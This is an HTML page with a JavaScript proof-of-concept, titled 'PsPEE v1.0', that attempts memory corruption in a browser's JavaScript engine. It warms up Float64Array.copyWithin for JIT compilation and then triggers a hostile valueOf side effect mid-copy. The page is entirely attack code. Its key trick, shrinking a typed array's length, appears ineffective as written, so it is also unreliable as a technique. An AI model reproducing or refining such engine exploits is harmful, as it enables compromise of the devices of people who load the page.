<!DOCTYPE html>
<html>
<head>
    <style>
        #output {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #111;
            color: #0f0;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            width: 100%;
            height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="output"></div>
    <script>
        const log = (msg) => document.getElementById("output").textContent += msg + "\n";

        log("[INFO] PsPEE v1.0 — starting fallback memory corruption attempt.");

        // Setup: repeatedly train copyWithin to DFG compile
        let ab = new ArrayBuffer(0x100);
        let victim = new Float64Array(ab);

        for (let i = 0; i < 100; i++) {
            victim.copyWithin(0, 1); // Warm up the DFG
        }

        // Step 2: Craft an object with side effects
        let evil = {
            valueOf: function() {
                log("[*] valueOf triggered");
                // Try replacing victim array or tampering
                victim.length = 1; // Not normally legal, but may cause confusion
                return 1;
            }
        };

        try {
            // This triggers our side-effect mid-copy
            victim.copyWithin(10, evil);
            log("[+] copyWithin with valueOf ran");
        } catch (e) {
            log("[!] Exception: " + e);
        }

        // Observe results
        for (let i = 0; i < 20; i++) {
            log(`victim[${i}] = ${victim[i]}`);
        }
    </script>
</body>
</html>
